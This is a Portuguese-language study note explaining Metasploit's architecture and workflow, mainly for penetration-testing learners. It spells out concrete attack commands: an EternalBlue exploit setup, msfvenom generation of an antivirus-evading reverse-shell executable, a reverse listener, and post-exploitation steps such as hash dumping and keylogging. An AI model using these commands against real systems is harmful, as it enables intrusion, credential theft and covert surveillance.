# 🔬 Metasploit — Fundamentos e Arquitetura

> Se Nmap é o microscópio da rede, o Metasploit é o laboratório inteiro.
> Não é "um exploit". É uma framework de desenvolvimento e execução de ataques.

---

## 🧠 O Que o Metasploit Realmente É

Criado por H.D. Moore em 2003, mantido hoje pela Rapid7.
Padrão de facto para testes de intrusão.

Uma estrutura **modular** composta por:

| Componente | Função |
|-----------|--------|
| **Exploit** | Código que explora uma vulnerabilidade específica |
| **Payload** | O que acontece após a exploração |
| **Encoder** | Ofusca o payload (evasão de AV) |
| **Auxiliary** | Scanners, fuzzers, brute force |
| **Post** | Ações após obter acesso (pós-exploração) |

```bash
# Entrar no console interativo
msfconsole
```

---

## 🧩 Estrutura Modular em Detalhe

### 1️⃣ Exploit
Código que aproveita uma falha específica e cria a condição para execução de código.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

> ⚠️ Exploit ≠ shell. Ele só cria a condição. O payload executa o que você quer.

---

### 2️⃣ Payload
O que roda no alvo depois da exploração bem-sucedida.

| Tipo | Descrição |
|------|-----------|
| `cmd` | Executa um único comando |
| `reverse_shell` | Shell reverso simples |
| `meterpreter` | Payload avançado em memória |

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

### 3️⃣ Meterpreter
A parte realmente poderosa do Metasploit.

Não é um shell comum. É uma **shell em memória** projetada para:
- Evitar gravação em disco
- Evadir antivírus
- Permitir pivoting
- Permanecer estável na sessão

**Comandos essenciais:**
```bash
sysinfo          # informações do sistema
getuid           # usuário atual
hashdump         # dump de hashes NTLM
screenshot       # captura de tela
keyscan_start    # inicia keylogger
upload / download # transferência de arquivos
shell            # abre shell nativa
background       # coloca sessão em background
```

---

### 4️⃣ Reverse vs Bind Shell

| Tipo | Direção da Conexão | Quando Usar |
|------|-------------------|------------|
| **Reverse** | Alvo → conecta em você | Preferido — bypassa firewall de entrada |
| **Bind** | Você → conecta no alvo | Quando você controla o roteamento |

> Reverse shell é preferido porque o firewall do alvo geralmente bloqueia **entradas**, não **saídas**.

---

### 5️⃣ Handler (Listener)
Metasploit abre um "ouvinte" aguardando o alvo se conectar de volta.

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST SEU_IP
set LPORT 4444
run
```

---

### 6️⃣ Encoders e msfvenom
Ofuscam o payload para tentar evadir assinatura estática de antivírus.

```bash
# Gerar payload executável
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=IP LPORT=4444 \
  -e x86/shikata_ga_nai \
  -f exe > shell.exe
```

`shikata_ga_nai` é um encoder **polimórfico** — gera output diferente a cada execução.

---

## 🔁 Configuração Padrão de um Módulo

```bash
use exploit/...
show options          # ver opções disponíveis
set RHOSTS IP_ALVO
set LHOST SEU_IP
set LPORT 4444
run                   # ou exploit
```

---

## 🎯 Fases Típicas no Metasploit

### Fase 1 — Recon com Auxiliary
```bash
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/portscan/tcp
```

### Fase 2 — Exploração
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST SEU_IP
run
```

### Fase 3 — Pós-Exploração
```bash
# Com sessão meterpreter aberta
background
use post/windows/gather/hashdump
use post/multi/recon/local_exploit_suggester
use post/windows/manage/migrate
```

---

## ⚠️ Realidade Prática

| Contexto | Metasploit |
|---------|-----------|
| Laboratório e CTF | ✅ Excelente |
| Aprendizado de arquitetura de ataque | ✅ Excelente |
| Validação de vulnerabilidade | ✅ Excelente |
| Red team avançado sem modificação | ❌ Muito detectável |
| Ambientes com EDR moderno | ❌ Assinatura conhecida |

**Por que é detectável:**
- Assinaturas do meterpreter são amplamente conhecidas
- Padrões de rede previsíveis
- Comportamento de memória identificável por EDR

Red teams avançados costumam modificar payloads, usar Cobalt Strike ou frameworks customizados.

---

## 🧠 O Que o Metasploit Ensina de Verdade

A cadeia lógica de um ataque:

```
Vulnerabilidade identificada
        ↓
Exploit selecionado
        ↓
Payload configurado
        ↓
Sessão obtida
        ↓
Pós-exploração e movimento lateral
```

> Invasão não é "hackear senha".
> É uma **cadeia lógica** de decisões técnicas.

Dominar o Metasploit te faz pensar:
- Qual é o vetor de entrada?
- Qual payload é ideal para este ambiente?
- Qual é o objetivo pós-acesso?

---

## 📌 Relacionados

- [[Metasploit — Banco de Dados e Workspaces]]
- [[SMB — Enumeração e Comprometimento]]
- [[Nmap — NSE]]
- [[Nmap — Output Formats]]

#ferramenta/metasploit #exploração #conceito
